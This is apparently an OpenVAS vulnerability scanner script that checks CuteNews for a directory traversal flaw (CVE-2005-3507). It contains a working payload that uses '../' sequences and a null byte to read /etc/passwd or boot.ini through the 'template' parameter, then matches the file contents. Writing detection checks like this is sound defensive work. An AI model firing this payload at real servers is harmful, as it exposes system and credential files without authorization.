CPE = "cpe:/a:cutephp:cutenews";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.20137" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)" );
	script_cve_id( "CVE-2005-3507" );
	script_bugtraq_id( 15295 );
	script_xref( name: "OSVDB", value: "20472" );
	script_xref( name: "OSVDB", value: "20473" );
	script_xref( name: "OSVDB", value: "20474" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "CuteNews directory traversal flaw" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2005 David Maciejak" );
	script_family( "Web application abuses" );
	script_require_ports( "Services/www", 80 );
	script_dependencies( "cutenews_detect.sc", "cross_site_scripting.sc" );
	script_mandatory_keys( "cutenews/installed" );
	script_xref( name: "URL", value: "http://retrogod.altervista.org/cute141.html" );
	script_tag( name: "solution", value: "Update to the latest version." );
	script_tag( name: "summary", value: "The version of CuteNews installed on the remote host fails to sanitize
  user-supplied input to the 'template' parameter of the 'show_archives.php' and 'show_news.php' scripts." );
	script_tag( name: "impact", value: "An attacker can exploit this issue to read arbitrary files and possibly
  even execute arbitrary PHP code on the remote host, subject to the privileges of the web server user id." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
for file in make_list( "etc/passwd",
	 "boot.ini" ) {
	url = dir + "/show_archives.php?template=../../../../../../../../../" + file + "%00";
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(res == NULL){
		exit( 0 );
	}
	if(egrep( pattern: "(root:.*:0:[01]:|\\[boot loader\\])", string: res )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

